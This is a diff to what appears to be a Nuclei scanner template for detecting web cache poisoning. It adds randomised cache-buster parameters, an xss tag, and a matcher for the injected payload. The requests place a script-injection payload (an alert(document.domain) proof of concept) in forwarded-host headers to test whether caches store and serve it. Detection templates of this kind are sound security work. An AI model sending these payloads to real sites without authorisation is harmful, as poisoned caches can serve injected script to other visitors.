@@ -7,19 +7,27 @@ info:
   reference:
     - https://blog.melbadry9.xyz/fuzzing/nuclei-cache-poisoning
     - https://portswigger.net/research/practical-web-cache-poisoning
-  tags: cache,generic
+  tags: cache,generic,xss
 
 requests:
   - raw:
       - |
-        GET /?test=1337 HTTP/1.1
+        GET /?test={{randstr}} HTTP/1.1
         X-Forwarded-Prefix: cache.example.com"></script><script>alert(document.domain);</script>
         X-Forwarded-Host: cache.example.com"></script><script>alert(document.domain);</script>
         X-Forwarded-For: cache.example.com"></script><script>alert(document.domain);</script>
+
       - |
-        GET /?test=1337 HTTP/1.1
+        GET /?test={{randstr}} HTTP/1.1
+
     req-condition: true
+    matchers-condition: and
     matchers:
       - type: dsl
         dsl:
           - 'contains(body_2, "cache.example.com")'
+
+      - type: word
+        part: body
+        words:
+          - '"></script><script>alert(document.domain);</script>'
